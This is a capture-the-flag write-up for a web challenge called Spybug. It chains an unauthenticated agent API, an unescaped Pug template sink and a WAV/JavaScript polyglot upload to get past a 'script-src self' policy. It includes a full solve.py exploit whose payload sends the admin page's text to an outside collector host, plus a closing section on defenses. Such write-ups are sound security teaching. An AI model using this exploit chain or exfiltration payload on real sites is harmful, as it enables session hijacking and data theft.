## Overview

Spybug is a Medium web challenge: a Node/Express/Pug control panel where a headless admin bot logs in every minute and the flag is rendered as the admin's username. The panel has an obvious [stored XSS](https://cwe.mitre.org/data/definitions/79.html), but a `Content-Security-Policy: script-src 'self'` header blocks inline scripts. The solve is getting a same-origin script to run — by uploading a WAV file that is also valid JavaScript.

## The technique

Three pieces combine:

**Unauthenticated agent API.** `GET /agents/register` hands out `{identifier, token}`, and `POST /agents/details/:id/:token` sets an agent's `hostname`/`platform`/`arch` — no user session required.

**Unescaped Pug sink.** The panel template renders the agent fields with Pug's raw-HTML interpolation:

```pug
td !{agent.hostname}
```

`!{}` does **not** escape, so a `hostname` of `<script src="...">` is injected verbatim into the admin's page.

**CSP bypass via a polyglot upload.** `script-src 'self'` forbids inline JS, but `/uploads` is same-origin. The upload endpoint only accepts WAV files — multer checks the (attacker-controlled) MIME type and `.wav` extension, and `file-type@16.0.0` re-checks the magic bytes. Crucially, that library detects WAV from just the ASCII markers `RIFF` at offset 0 and `WAVE` at offset 8, ignoring everything in between. So a file that begins:

```
RIFF=/*
WAVE*/<inline JS>//
```

passes the WAV check *and* parses as JavaScript — `RIFF = /* a comment that swallows the WAVE bytes */ <inline JS>`. Uploaded, it is served from `/uploads/<uuid>` as `application/octet-stream` with no `X-Content-Type-Options: nosniff`, so a same-origin `<script src="/uploads/<uuid>">` executes it. This is the same [content-sniffing upload bypass](https://cwe.mitre.org/data/definitions/434.html) class as JPEG/JS avatars, just with a WAV container.

## Solution

Register an agent, upload the polyglot, then set the agent's `hostname` to a `<script>` tag pointing at it. When the admin bot renders the panel, the script runs as admin, reads the flag out of the DOM, and exfiltrates it.

Create `solve.py`:

```python
#!/usr/bin/env python3
import requests
base = "http://" + open('target.txt').read().strip()
WH = "https://<your-collector>"          # any host — the CSP sets no connect/img/default-src

r = requests.get(f"{base}/agents/register").json()
aid, tok = r["identifier"], r["token"]

# INLINE payload — see "the gotcha" below (no eval)
js = b'new Image().src="' + WH.encode() + b'/?f="+encodeURIComponent(document.body.innerText)'
polyglot = b'RIFF=/*\nWAVE*/' + js + b'//'

uuid = requests.post(f"{base}/agents/upload/{aid}/{tok}",
                     files={"recording": ("x.wav", polyglot, "audio/wave")}).text.strip()

requests.post(f"{base}/agents/details/{aid}/{tok}",
              data={"hostname": f'<script src="/uploads/{uuid}"></script>',
                    "platform": "x", "arch": "x"})
# wait ~60s for the admin bot, then read the flag from your collector
```

The admin bot loads the panel, the polyglot runs, and the flag arrives at the collector inside the exfiltrated `document.body.innerText`:

```
HTB{...}
```

## The gotcha

`script-src 'self'` with no `'unsafe-eval'` **silently blocks `eval()`**. An `eval(atob("..."))` loader — the reflex for packing a payload — never runs, and there's no obvious error. The payload has to be written inline in the polyglot. A useful way to isolate this during debugging: drop an `<img src="https://collector/?ping">` into the same XSS sink. The image fires from the bot regardless of script execution, so if the image pings but the script doesn't, the problem is script execution (CSP `unsafe-eval` or MIME), not the injection or network egress.

## Why it worked

Every guardrail here checks the wrong thing. The upload filter validates a handful of magic bytes, not that the file is inert as a script. The static server omits `nosniff`, so the browser is willing to run an `octet-stream` file as JavaScript. And the CSP restricts *where* scripts load from (`'self'`) but the upload directory is part of `'self'`. Each control is individually reasonable; together they leave a same-origin script-execution path wide open.

## Fix / defense

Serve user uploads from a separate origin (or a sandboxed domain) and always send `X-Content-Type-Options: nosniff` with a fixed `Content-Type`. Escape template output by default (`#{}` in Pug, never `!{}` for user data). Don't trust magic-byte sniffing as an upload allow-list — re-encode media server-side so a polyglot can't survive. And require authentication on state-changing endpoints like agent registration and detail updates.
